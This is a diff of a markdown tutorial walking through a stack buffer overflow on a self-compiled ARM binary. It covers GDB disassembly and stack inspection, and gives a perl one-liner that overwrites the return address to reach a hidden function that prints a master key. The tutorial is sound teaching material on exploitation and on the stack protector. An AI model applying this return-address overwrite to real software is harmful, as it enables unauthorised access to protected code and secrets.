@@ -9,12 +9,17 @@ To be completed :sweat_smile:
 TODO
 
 ## An example of buffer overflow
+### Initial state
+- We have a binary without its source code but compiled with debug information.
+- We know how to use it: `./prog2 PASS` where `PASS` is a 4-character string.
+- We would like to know if there's interesting stuff or even dead code in it.
 
-
+### Playground
+Run GDB:
 ```bash
 gdb prog2
 ```
-
+What we can disassemble with GDB:
 ```assembly
 (gdb) disassemble
 /usr/include/arm-linux-gnueabihf/bits/sys_errlist.h  __gmon_start__                                       frame_dummy
@@ -45,7 +50,11 @@ __dso_handle                                         dont_touch_this            
 __end__                                              exit
 __frame_dummy_init_array_entry                       exit@plt
 ```
+Lots of stuff there... We can find at least two interesting:
+- `main`
+- `dont_touch_this`. Yes, I compiled the code myself for this tutorial. Of course, you should not name critical code like this!
 
+Let's disassemble the main function
 ```assembly
 (gdb) disassemble main
 Dump of assembler code for function main:
@@ -67,7 +76,10 @@ Dump of assembler code for function main:
    0x000104f4 <+60>:    pop     {r11, pc}
 End of assembler dump.
 ```
+- No call to `dont_touch_this`. It means this is a dead code section. Why?
+- Oh, `strcpy`! We found a breach! This functions must not be used nowadays as it doesn't buffer length (https://security.web.cern.ch/security/recommendations/en/codetools/c.shtml). We should try a buffer overflow at this line.
 
+If we disassemble `dont_touch_this`, we can get the entry point of this function (address `0x0001049c`):
 ```assembly
 (gdb) disassemble dont_touch_this
 Dump of assembler code for function dont_touch_this:
@@ -80,12 +92,12 @@ Dump of assembler code for function dont_touch_this:
    0x000104b4 <+24>:    andeq   r0, r1, r8, ror #10
 End of assembler dump.
 ```
-
+Putting a breakpoint right after the `strcpy`: 
 ```assembly
 (gdb) break *0x000104e8
 Breakpoint 1 at 0x104e8: file prog2.c, line 14.
 ```
-
+Running the progrm with valid input and checking reisters and stack values:
 ```assembly
 (gdb) run AAAA
 Starting program: /home/pi/Documents/tutorial/prog2 AAAA
@@ -113,7 +125,6 @@ lr             0x104e8  66792
 pc             0x104e8  0x104e8 <main+48>
 cpsr           0x20000010       536870928
 ```
-
 ```assembly
 (gdb) x/16x $sp
 0x7efff518:     0x7efff684      0x00000002      0x00000000      0x41414141
@@ -121,7 +132,10 @@ cpsr           0x20000010       536870928
 0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
 0x7efff548:     0xf35a2f10      0xfb4ddc14      0x000104f8      0x00000000
 ```
+- In the stack, we can see our `AAAA` as `0x41414141` (ASCII codes, little-endian).
+- `0x76e80678` is the return address.
 
+Same thing with longer input:
 ```assembly
 (gdb) run ABCDABCD
 Starting program: /home/pi/Documents/tutorial/prog2 ABCDABCD
@@ -134,6 +148,7 @@ Starting program: /home/pi/Documents/tutorial/prog2 ABCDABCD
 0x7efff538:     0x00000002      0x000104b8      0x76ffecf0      0x7efff5d0
 0x7efff548:     0xc9cf5894      0xc1d8ab90      0x000104f8      0x00000000
 ```
+- As expected, we find the `0x44434241` twice (corresponds to `ABCD`).  
 
 ```assembly
 (gdb) continue
@@ -144,10 +159,22 @@ Program received signal SIGSEGV, Segmentation fault.
     fini=0x10558 <__libc_csu_fini>, rtld_fini=0x76fdf9b8 <_dl_fini>, stack_end=0x7efff684) at libc-start.c:247
 247     libc-start.c: No such file or directory.
 ```
+If we continue the program execution, we see a segfault while the return address is `0x76e80600`..
+There's already a buffer overflow here. However, it would be useful to redirect it to the `dont_touch_this` method to see what's in there.
 
 ```bash
 pi@raspberrypi:~/Documents/tutorial $ ./prog2 $(perl -e 'print "ABCDABCD\x9c\x04\x01";')
 The master key is 0xDEADBEEF
+```
+YES! We entered the dead code and found a master key :smiling_imp:
+- `ABCDABCD` to fill the stack with some bytes (it could be anything).
+- The next 3 bytes are the entry point of `dont_touch_this` in little endian (see GDB output).
+- I was lucky because this binary was compiled without stack protection. It seems a bit crazy but, on a default Raspbian distro, the `fstack-protector` flag is not enabled...
+
+If I tried my buffer overflow attack when the binary has been compiled with the stack protector, I would get the following message:
+```bash
+*** stack smashing detected ***: ./prog2 terminated
+Aborted__
 ```
 
 ## References
